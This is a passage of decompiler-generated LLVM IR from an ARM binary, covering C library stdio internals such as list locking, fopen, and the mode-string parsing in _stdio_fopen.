  %v1_1f410 = add i32 %v0_1f410, 60
  %v2_1f410 = inttoptr i32 %v1_1f410 to i32*
  %v3_1f410 = load i32, i32* %v2_1f410, align 4
  %v1_1f414 = add i32 %v3_1f410, -1
  store i32 %v1_1f414, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f418 = icmp eq i32 %v1_1f414, 0
  store i32 %v1_1f414, i32* %v2_1f410, align 4
  br i1 %v2_1f418, label %dec_label_pc_1f424, label %dec_label_pc_1f484

dec_label_pc_1f424:                               ; preds = %dec_label_pc_1f410
  %v0_1f424 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f424 = load i32, i32* @r5, align 4
  %v2_1f424 = add i32 %v1_1f424, 64
  %v3_1f424 = inttoptr i32 %v2_1f424 to i32*
  store i32 %v0_1f424, i32* %v3_1f424, align 4
  %v0_1f428 = load i32, i32* @r5, align 4
  %v1_1f428 = add i32 %v0_1f428, 56
  store i32 %v1_1f428, i32* @r6, align 4
  br label %dec_label_pc_1f42c

dec_label_pc_1f42c:                               ; preds = %dec_label_pc_1f45c.dec_label_pc_1f42c_crit_edge, %dec_label_pc_1f424
  %v0_1f434 = phi i32 [ %v0_1f434.pre, %dec_label_pc_1f45c.dec_label_pc_1f42c_crit_edge ], [ %v1_1f428, %dec_label_pc_1f424 ]
  %v0_1f42c = phi i32 [ %v0_1f42c.pre, %dec_label_pc_1f45c.dec_label_pc_1f42c_crit_edge ], [ %v0_1f428, %dec_label_pc_1f424 ]
  %v1_1f42c = add i32 %v0_1f42c, 56
  %v2_1f42c = inttoptr i32 %v1_1f42c to i32*
  %v3_1f42c = load i32, i32* %v2_1f42c, align 4
  store i32 %v3_1f42c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1f434, i32* %r2.global-to-local, align 4
  %v1_1f43882 = inttoptr i32 %v0_1f434 to i32*
  %v2_1f43883 = load i32, i32* %v1_1f43882, align 4
  store i32 %v2_1f43883, i32* %r3.global-to-local, align 4
  %v3_1f43c85 = icmp uge i32 %v2_1f43883, %v3_1f42c
  store i1 %v3_1f43c85, i1* %cpsr_c.global-to-local, align 1
  %v9_1f43c91 = icmp eq i32 %v2_1f43883, %v3_1f42c
  br i1 %v9_1f43c91, label %dec_label_pc_1f444, label %dec_label_pc_1f45c

dec_label_pc_1f444:                               ; preds = %dec_label_pc_1f42c, %dec_label_pc_1f444.dec_label_pc_1f438_crit_edge
  %v0_1f44492 = phi i32 [ %v1_1f43c.pre, %dec_label_pc_1f444.dec_label_pc_1f438_crit_edge ], [ %v3_1f42c, %dec_label_pc_1f42c ]
  store i32 %v0_1f44492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f454 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f454, label %dec_label_pc_1f458, label %dec_label_pc_1f444.dec_label_pc_1f438_crit_edge

dec_label_pc_1f444.dec_label_pc_1f438_crit_edge:  ; preds = %dec_label_pc_1f444
  %v0_1f438.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f43c.pre = load i32, i32* @r4, align 4
  %v1_1f438 = inttoptr i32 %v0_1f438.pre to i32*
  %v2_1f438 = load i32, i32* %v1_1f438, align 4
  store i32 %v2_1f438, i32* %r3.global-to-local, align 4
  %v3_1f43c = icmp uge i32 %v2_1f438, %v1_1f43c.pre
  store i1 %v3_1f43c, i1* %cpsr_c.global-to-local, align 1
  %v9_1f43c = icmp eq i32 %v2_1f438, %v1_1f43c.pre
  br i1 %v9_1f43c, label %dec_label_pc_1f444, label %dec_label_pc_1f45c

dec_label_pc_1f458:                               ; preds = %dec_label_pc_1f444
  %v0_1f458 = load i32, i32* @r4, align 4
  store i32 %v0_1f458, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f45c

dec_label_pc_1f45c:                               ; preds = %dec_label_pc_1f42c, %dec_label_pc_1f444.dec_label_pc_1f438_crit_edge, %dec_label_pc_1f458
  %v0_1f464 = phi i32 [ %v0_1f458, %dec_label_pc_1f458 ], [ %v2_1f43883, %dec_label_pc_1f42c ], [ %v2_1f438, %dec_label_pc_1f444.dec_label_pc_1f438_crit_edge ]
  %v1_1f45c = phi i32 [ %v0_1f458, %dec_label_pc_1f458 ], [ %v3_1f42c, %dec_label_pc_1f42c ], [ %v1_1f43c.pre, %dec_label_pc_1f444.dec_label_pc_1f438_crit_edge ]
  %v3_1f45c = icmp uge i32 %v0_1f464, %v1_1f45c
  store i1 %v3_1f45c, i1* %cpsr_c.global-to-local, align 1
  %v9_1f45c = icmp eq i32 %v0_1f464, %v1_1f45c
  br i1 %v9_1f45c, label %dec_label_pc_1f464, label %dec_label_pc_1f45c.dec_label_pc_1f42c_crit_edge

dec_label_pc_1f45c.dec_label_pc_1f42c_crit_edge:  ; preds = %dec_label_pc_1f45c
  %v0_1f42c.pre = load i32, i32* @r5, align 4
  %v0_1f434.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1f42c

dec_label_pc_1f464:                               ; preds = %dec_label_pc_1f45c
  %v2_1f464 = icmp ne i32 %v1_1f45c, 0
  store i1 %v2_1f464, i1* %cpsr_c.global-to-local, align 1
  %v7_1f468 = icmp slt i32 %v1_1f45c, 2
  br i1 %v7_1f468, label %dec_label_pc_1f484, label %dec_label_pc_1f46c

dec_label_pc_1f46c:                               ; preds = %dec_label_pc_1f464
  %v0_1f46c = load i32, i32* @r5, align 4
  %v1_1f46c = add i32 %v0_1f46c, 56
  store i32 %v1_1f46c, i32* %r0.global-to-local, align 4
  %v0_1f470 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f470 = add i32 %v0_1f470, 129
  store i32 %v1_1f470, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f484

dec_label_pc_1f484:                               ; preds = %dec_label_pc_1f410, %dec_label_pc_1f3f8, %dec_label_pc_1f46c, %dec_label_pc_1f464
  %v0_1f484 = load i32, i32* @r5, align 4
  %v1_1f484 = inttoptr i32 %v0_1f484 to i16*
  %v2_1f484 = load i16, i16* %v1_1f484, align 2
  %v3_1f484 = zext i16 %v2_1f484 to i32
  store i32 %v3_1f484, i32* %r3.global-to-local, align 4
  %v1_1f488 = and i32 %v3_1f484, 16384
  %v2_1f488 = icmp eq i32 %v1_1f488, 0
  br i1 %v2_1f488, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_1f484
  %v2_1f48c = add i32 %v0_1f484, 8
  %v3_1f48c = inttoptr i32 %v2_1f48c to i32*
  %v4_1f48c = load i32, i32* %v3_1f48c, align 4
  store i32 %v4_1f48c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1f484, %bb48
  %v1_1f490 = xor i1 %v2_1f488, true
  call void @__pseudo_cond_branch(i1 %v1_1f490, i32 ptrtoint (i32* @global_var_1c6e8.667 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1f498 = load i32, i32* @r8, align 4
  %v2_1f498 = add i32 %v0_1f498, 160
  %v3_1f498 = inttoptr i32 %v2_1f498 to i32*
  %v4_1f498 = load i32, i32* %v3_1f498, align 4
  store i32 %v4_1f498, i32* @r5, align 4
  %v1_1f49c = add i32 %v4_1f498, 8
  %v2_1f49c = inttoptr i32 %v1_1f49c to i32*
  %v3_1f49c = load i32, i32* %v2_1f49c, align 4
  store i32 %v3_1f49c, i32* %r3.global-to-local, align 4
  %v1_1f4a0 = load i32, i32* %sl.global-to-local, align 4
  %v3_1f4a0 = icmp uge i32 %v3_1f49c, %v1_1f4a0
  store i1 %v3_1f4a0, i1* %cpsr_c.global-to-local, align 1
  %v9_1f4a0 = icmp eq i32 %v3_1f49c, %v1_1f4a0
  br i1 %v9_1f4a0, label %dec_label_pc_1f4e8, label %dec_label_pc_1f4a8

dec_label_pc_1f4a8:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_1f498, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1f4b475 = inttoptr i32 %v4_1f498 to i32*
  %v2_1f4b476 = load i32, i32* %v1_1f4b475, align 4
  store i32 %v2_1f4b476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1f4b878 = icmp eq i32 %v2_1f4b476, 0
  br i1 %v9_1f4b878, label %dec_label_pc_1f4c0, label %dec_label_pc_1f4d8

dec_label_pc_1f4c0:                               ; preds = %dec_label_pc_1f4a8, %dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge
  %v0_1f4c079 = phi i32 [ %v1_1f4b8.pre, %dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge ], [ 0, %dec_label_pc_1f4a8 ]
  store i32 %v0_1f4c079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f4d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f4d0, label %dec_label_pc_1f4d4, label %dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge

dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge:  ; preds = %dec_label_pc_1f4c0
  %v0_1f4b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f4b8.pre = load i32, i32* @r4, align 4
  %v1_1f4b4 = inttoptr i32 %v0_1f4b4.pre to i32*
  %v2_1f4b4 = load i32, i32* %v1_1f4b4, align 4
  store i32 %v2_1f4b4, i32* %r3.global-to-local, align 4
  %v3_1f4b8 = icmp uge i32 %v2_1f4b4, %v1_1f4b8.pre
  store i1 %v3_1f4b8, i1* %cpsr_c.global-to-local, align 1
  %v9_1f4b8 = icmp eq i32 %v2_1f4b4, %v1_1f4b8.pre
  br i1 %v9_1f4b8, label %dec_label_pc_1f4c0, label %dec_label_pc_1f4d8

dec_label_pc_1f4d4:                               ; preds = %dec_label_pc_1f4c0
  %v0_1f4d4 = load i32, i32* @r4, align 4
  store i32 %v0_1f4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f4d8

dec_label_pc_1f4d8:                               ; preds = %dec_label_pc_1f4a8, %dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge, %dec_label_pc_1f4d4
  %v0_1f4d8 = phi i32 [ %v0_1f4d4, %dec_label_pc_1f4d4 ], [ %v2_1f4b476, %dec_label_pc_1f4a8 ], [ %v2_1f4b4, %dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge ]
  %v1_1f4d8 = phi i32 [ %v0_1f4d4, %dec_label_pc_1f4d4 ], [ 0, %dec_label_pc_1f4a8 ], [ %v1_1f4b8.pre, %dec_label_pc_1f4c0.dec_label_pc_1f4b4_crit_edge ]
  %v3_1f4d8 = icmp uge i32 %v0_1f4d8, %v1_1f4d8
  store i1 %v3_1f4d8, i1* %cpsr_c.global-to-local, align 1
  %v9_1f4d8 = icmp eq i32 %v0_1f4d8, %v1_1f4d8
  br i1 %v9_1f4d8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_1f4d8
  %v1_1f4dc = load i32, i32* @r5, align 4
  store i32 %v1_1f4dc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_1f4d8, %bb50
  %v1_1f4e0 = xor i1 %v9_1f4d8, true
  call void @__pseudo_cond_branch(i1 %v1_1f4e0, i32 ptrtoint (i32* @global_var_1d8a0.575 to i32))
  %v0_1f4e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_1f4e4 = load i32, i32* @r5, align 4
  %v2_1f4e4 = add i32 %v1_1f4e4, 8
  %v3_1f4e4 = inttoptr i32 %v2_1f4e4 to i32*
  store i32 %v0_1f4e4, i32* %v3_1f4e4, align 4
  %v0_1f4ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1f4e8

dec_label_pc_1f4e8:                               ; preds = %bb49, %bb51
  %v0_1f4ec = phi i32 [ %v0_1f498, %bb49 ], [ %v0_1f4ec.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1f4ec = add i32 %v0_1f4ec, 80
  %v3_1f4ec = inttoptr i32 %v2_1f4ec to i32*
  %v4_1f4ec = load i32, i32* %v3_1f4ec, align 4
  store i32 %v4_1f4ec, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_1f4f4 = add i32 %v0_1f4ec, 160
  %v3_1f4f4 = inttoptr i32 %v2_1f4f4 to i32*
  %v4_1f4f4 = load i32, i32* %v3_1f4f4, align 4
  store i32 %v4_1f4f4, i32* %r0.global-to-local, align 4
  %v1_1f4f8 = inttoptr i32 %v4_1f4ec to i32*
  %v2_1f4f8 = load i32, i32* %v1_1f4f8, align 4
  store i32 %v2_1f4f8, i32* %r3.global-to-local, align 4
  %v1_1f4fc = add i32 %v4_1f4f4, 4
  %v2_1f4fc = inttoptr i32 %v1_1f4fc to i32*
  %v3_1f4fc = load i32, i32* %v2_1f4fc, align 4
  store i32 %v3_1f4fc, i32* %r1.global-to-local, align 4
  %v1_1f500 = add i32 %v2_1f4f8, 1
  store i32 %v1_1f500, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f504 = icmp eq i32 %v3_1f4fc, 0
  store i32 %v1_1f500, i32* %v1_1f4f8, align 4
  br i1 %v2_1f504, label %dec_label_pc_1f510, label %dec_label_pc_1f570

dec_label_pc_1f510:                               ; preds = %dec_label_pc_1f4e8
  %v0_1f510 = load i32, i32* %r1.global-to-local, align 4
  %v1_1f510 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f510 = add i32 %v1_1f510, 8
  %v3_1f510 = inttoptr i32 %v2_1f510 to i32*
  store i32 %v0_1f510, i32* %v3_1f510, align 4
  %v0_1f514 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1f514, i32* @r5, align 4
  br label %dec_label_pc_1f518

dec_label_pc_1f518:                               ; preds = %dec_label_pc_1f548.dec_label_pc_1f518_crit_edge, %dec_label_pc_1f510
  %v0_1f518 = phi i32 [ %v0_1f518.pre, %dec_label_pc_1f548.dec_label_pc_1f518_crit_edge ], [ %v0_1f514, %dec_label_pc_1f510 ]
  %v1_1f518 = inttoptr i32 %v0_1f518 to i32*
  %v2_1f518 = load i32, i32* %v1_1f518, align 4
  store i32 %v2_1f518, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_1f518, i32* %r2.global-to-local, align 4
  %v2_1f52464 = load i32, i32* %v1_1f518, align 4
  store i32 %v2_1f52464, i32* %r3.global-to-local, align 4
  %v3_1f52866 = icmp uge i32 %v2_1f52464, %v2_1f518
  store i1 %v3_1f52866, i1* %cpsr_c.global-to-local, align 1
  %v9_1f52872 = icmp eq i32 %v2_1f52464, %v2_1f518
  br i1 %v9_1f52872, label %dec_label_pc_1f530, label %dec_label_pc_1f548

dec_label_pc_1f530:                               ; preds = %dec_label_pc_1f518, %dec_label_pc_1f530.dec_label_pc_1f524_crit_edge
  %v0_1f53073 = phi i32 [ %v1_1f528.pre, %dec_label_pc_1f530.dec_label_pc_1f524_crit_edge ], [ %v2_1f518, %dec_label_pc_1f518 ]
  store i32 %v0_1f53073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f540 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f540, label %dec_label_pc_1f544, label %dec_label_pc_1f530.dec_label_pc_1f524_crit_edge

dec_label_pc_1f530.dec_label_pc_1f524_crit_edge:  ; preds = %dec_label_pc_1f530
  %v0_1f524.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f528.pre = load i32, i32* @r4, align 4
  %v1_1f524 = inttoptr i32 %v0_1f524.pre to i32*
  %v2_1f524 = load i32, i32* %v1_1f524, align 4
  store i32 %v2_1f524, i32* %r3.global-to-local, align 4
  %v3_1f528 = icmp uge i32 %v2_1f524, %v1_1f528.pre
  store i1 %v3_1f528, i1* %cpsr_c.global-to-local, align 1
  %v9_1f528 = icmp eq i32 %v2_1f524, %v1_1f528.pre
  br i1 %v9_1f528, label %dec_label_pc_1f530, label %dec_label_pc_1f548

dec_label_pc_1f544:                               ; preds = %dec_label_pc_1f530
  %v0_1f544 = load i32, i32* @r4, align 4
  store i32 %v0_1f544, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f548

dec_label_pc_1f548:                               ; preds = %dec_label_pc_1f518, %dec_label_pc_1f530.dec_label_pc_1f524_crit_edge, %dec_label_pc_1f544
  %v0_1f550 = phi i32 [ %v0_1f544, %dec_label_pc_1f544 ], [ %v2_1f52464, %dec_label_pc_1f518 ], [ %v2_1f524, %dec_label_pc_1f530.dec_label_pc_1f524_crit_edge ]
  %v1_1f548 = phi i32 [ %v0_1f544, %dec_label_pc_1f544 ], [ %v2_1f518, %dec_label_pc_1f518 ], [ %v1_1f528.pre, %dec_label_pc_1f530.dec_label_pc_1f524_crit_edge ]
  %v3_1f548 = icmp uge i32 %v0_1f550, %v1_1f548
  store i1 %v3_1f548, i1* %cpsr_c.global-to-local, align 1
  %v9_1f548 = icmp eq i32 %v0_1f550, %v1_1f548
  br i1 %v9_1f548, label %dec_label_pc_1f550, label %dec_label_pc_1f548.dec_label_pc_1f518_crit_edge

dec_label_pc_1f548.dec_label_pc_1f518_crit_edge:  ; preds = %dec_label_pc_1f548
  %v0_1f518.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1f518

dec_label_pc_1f550:                               ; preds = %dec_label_pc_1f548
  %v2_1f550 = icmp ne i32 %v1_1f548, 0
  store i1 %v2_1f550, i1* %cpsr_c.global-to-local, align 1
  %v7_1f554 = icmp slt i32 %v1_1f548, 2
  br i1 %v7_1f554, label %dec_label_pc_1f570, label %dec_label_pc_1f558

dec_label_pc_1f558:                               ; preds = %dec_label_pc_1f550
  %v0_1f558 = load i32, i32* @r5, align 4
  store i32 %v0_1f558, i32* %r0.global-to-local, align 4
  %v0_1f55c = load i32, i32* %r1.global-to-local, align 4
  %v1_1f55c = add i32 %v0_1f55c, 129
  store i32 %v1_1f55c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f570

dec_label_pc_1f570:                               ; preds = %dec_label_pc_1f4e8, %dec_label_pc_1f558, %dec_label_pc_1f550
  %v0_1f570 = call i32 @_stdio_openlist_dec_use()
  %v0_1f574 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1f574, i32* %r0.global-to-local, align 4
  %v2_1f57c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1f57c, i32* @r4, align 4
  store i32 %v6_1f264, i32* @r5, align 4
  store i32 %v9_1f264, i32* @r6, align 4
  store i32 %v12_1f264, i32* @r7, align 4
  ret i32 %v0_1f574

; uselistorder directives
  uselistorder i32 %v0_1f544, { 1, 0, 2 }
  uselistorder i32 %v1_1f528.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f518, { 1, 0 }
  uselistorder i32 %v0_1f4ec, { 1, 0 }
  uselistorder i32 %v0_1f4d4, { 1, 0, 2 }
  uselistorder i32 %v1_1f4b8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1f4a0, { 1, 0 }
  uselistorder i32 %v0_1f458, { 1, 0, 2 }
  uselistorder i32 %v1_1f43c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f3cc, { 1, 0, 2 }
  uselistorder i32 %v1_1f3b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f3a0, { 1, 0 }
  uselistorder i32 %v0_1f35c, { 1, 0, 2 }
  uselistorder i32 %v1_1f340.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f320, { 1, 0 }
  uselistorder i32 %v1_1f2ac.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 6, 7, 9, 8, 0, 10, 11, 12, 13, 14, 16, 15, 1, 17, 20, 18, 19, 21, 23, 22, 2, 24, 25, 26, 27, 28, 30, 29, 3, 31, 32, 33, 34, 36, 35, 4, 37, 38, 39, 40, 41, 42, 43, 45, 44, 5, 46 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 6, 7, 9, 8, 0, 10, 11, 13, 12, 1, 14, 15, 16, 18, 17, 2, 19, 20, 21, 22, 24, 23, 3, 25, 26, 28, 27, 4, 29, 30, 31, 33, 32, 5, 34, 35 }
  uselistorder i32 (i32)* @__GI___libc_close, { 19, 18, 45, 44, 17, 47, 46, 16, 15, 14, 13, 12, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 7, 11, 10, 9, 8, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_1f570, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1f548, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f530, { 1, 0 }
  uselistorder label %dec_label_pc_1f4e8, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_1f4d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f4c0, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_1f484, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1f45c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f444, { 1, 0 }
  uselistorder label %dec_label_pc_1f3f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1f3d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f3b8, { 1, 0 }
  uselistorder label %dec_label_pc_1f370, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1f360, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f348, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_1f2e8, { 1, 0 }
  uselistorder label %dec_label_pc_1f2dc, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1f2cc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f2b4, { 1, 0 }
}

define i32 @function_1f588(i32 %arg1) local_unnamed_addr {
dec_label_pc_1f588:
  %v0_1f588 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1f588, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1f588
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1f588, %bb
  %v10_1f590 = phi i32 [ %arg1, %dec_label_pc_1f588 ], [ 0, %bb ]
  ret i32 %v10_1f590

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1f5a4 = call i32 @_stdio_fopen()
  ret i32 %v0_1f5a4
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1f5b4 = load i32, i32* @r4, align 4
  store i32 %v3_1f5b4, i32* %stack_var_-24, align 4
  %v6_1f5b4 = load i32, i32* @r5, align 4
  %v9_1f5b4 = load i32, i32* @r6, align 4
  %v12_1f5b4 = load i32, i32* @r7, align 4
  %v15_1f5b4 = load i32, i32* @r8, align 4
  %v0_1f5b8 = load i32, i32* @r1, align 4
  %v1_1f5b8 = inttoptr i32 %v0_1f5b8 to i8*
  %v2_1f5b8 = load i8, i8* %v1_1f5b8, align 1
  %v2_1f5c0 = icmp ugt i8 %v2_1f5b8, 113
  store i1 %v2_1f5c0, i1* %cpsr_c.global-to-local, align 1
  %v7_1f5c0 = icmp eq i8 %v2_1f5b8, 114
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r8, align 4
  %v0_1f5cc = load i32, i32* @r0, align 4
  store i32 %v0_1f5cc, i32* @r7, align 4
  %v0_1f5d0 = load i32, i32* @r2, align 4
  store i32 %v0_1f5d0, i32* @r5, align 4
  %v0_1f5d4 = load i32, i32* @r3, align 4
  store i32 %v0_1f5d4, i32* @r6, align 4
  br i1 %v7_1f5c0, label %dec_label_pc_1f628, label %dec_label_pc_1f5dc

dec_label_pc_1f5dc:                               ; preds = %entry
  %v2_1f5dc = icmp ugt i8 %v2_1f5b8, 118
  store i1 %v2_1f5dc, i1* %cpsr_c.global-to-local, align 1
  %v7_1f5dc = icmp eq i8 %v2_1f5b8, 119
  br i1 %v7_1f5dc, label %bb, label %dec_label_pc_1f5e8

bb:                                               ; preds = %dec_label_pc_1f5dc
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1f62c

dec_label_pc_1f5e8:                               ; preds = %dec_label_pc_1f5dc
  %v2_1f5e8 = icmp ugt i8 %v2_1f5b8, 96
  store i1 %v2_1f5e8, i1* %cpsr_c.global-to-local, align 1
  %v7_1f5e8 = icmp eq i8 %v2_1f5b8, 97
  br i1 %v7_1f5e8, label %bb49, label %dec_label_pc_1f5f4

bb49:                                             ; preds = %dec_label_pc_1f5e8
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1f62c

dec_label_pc_1f5f4:                               ; preds = %dec_label_pc_1f5e8, %dec_label_pc_1f6c4, %dec_label_pc_1f698
  store i32 51812, i32* %r2.global-to-local, align 4
  %v0_1f5f8 = call i32 @__aeabi_read_tp()
  store i32 %v0_1f5f8, i32* %r0.global-to-local, align 4
  %v3_1f5fc = load i16, i16* @global_var_2c068.414, align 2
  %v4_1f5fc = sext i16 %v3_1f5fc to i32
  store i32 %v4_1f5fc, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_1f604 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f604 = icmp eq i32 %v0_1f604, 0
  %v3_1f608 = add i32 %v4_1f5fc, %v0_1f5f8
  %v4_1f608 = inttoptr i32 %v3_1f608 to i32*
  store i32 22, i32* %v4_1f608, align 4
  br i1 %v2_1f604, label %dec_label_pc_1f9cc, label %dec_label_pc_1f610

dec_label_pc_1f610:                               ; preds = %dec_label_pc_1f6e8._crit_edge, %dec_label_pc_1f5f4
  %v0_1f610 = load i32, i32* @r5, align 4
  %v1_1f610 = inttoptr i32 %v0_1f610 to i16*
  %v2_1f610 = load i16, i16* %v1_1f610, align 2
  %v3_1f610 = zext i16 %v2_1f610 to i32
  store i32 %v3_1f610, i32* %r3.global-to-local, align 4
  %v1_1f614 = and i32 %v3_1f610, 8192
  %v2_1f614 = icmp eq i32 %v1_1f614, 0
  br i1 %v2_1f614, label %dec_label_pc_1f9cc, label %dec_label_pc_1f61c

dec_label_pc_1f61c:                               ; preds = %dec_label_pc_1f610
  store i32 %v0_1f610, i32* @r0, align 4
  %v0_1f620 = call i32 @free()
  store i32 %v0_1f620, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1f9cc

dec_label_pc_1f628:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1f62c

dec_label_pc_1f62c:                               ; preds = %bb, %bb49, %dec_label_pc_1f628
  %v1_1f644 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_1f628 ]
  %v1_1f62c = add i32 %v0_1f5b8, 1
  %v2_1f62c = inttoptr i32 %v1_1f62c to i8*
  %v3_1f62c = load i8, i8* %v2_1f62c, align 1
  %v2_1f630 = icmp ugt i8 %v3_1f62c, 97
  store i1 %v2_1f630, i1* %cpsr_c.global-to-local, align 1
  %v7_1f630 = icmp eq i8 %v3_1f62c, 98
  %v1_1f62c.v0_1f5b8 = select i1 %v7_1f630, i32 %v1_1f62c, i32 %v0_1f5b8
  store i32 %v1_1f62c.v0_1f5b8, i32* %r3.global-to-local, align 4
  %v1_1f63c = add i32 %v1_1f62c.v0_1f5b8, 1
  %v2_1f63c = inttoptr i32 %v1_1f63c to i8*
  %v3_1f63c = load i8, i8* %v2_1f63c, align 1
  %v4_1f63c = zext i8 %v3_1f63c to i32
  store i32 %v4_1f63c, i32* @r3, align 4
  %v2_1f640 = icmp ugt i8 %v3_1f63c, 42
  store i1 %v2_1f640, i1* %cpsr_c.global-to-local, align 1
  %v7_1f640 = icmp eq i8 %v3_1f63c, 43
  br i1 %v7_1f640, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_1f62c
  store i32 %v1_1f644, i32* @r3, align 4
  %v2_1f648 = add nuw nsw i32 %v1_1f644, 1
  store i32 %v2_1f648, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1f62c, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f64c = icmp eq i32 %v0_1f5d0, 0
  br i1 %v2_1f64c, label %dec_label_pc_1f654, label %dec_label_pc_1f690

dec_label_pc_1f654:                               ; preds = %.thread3
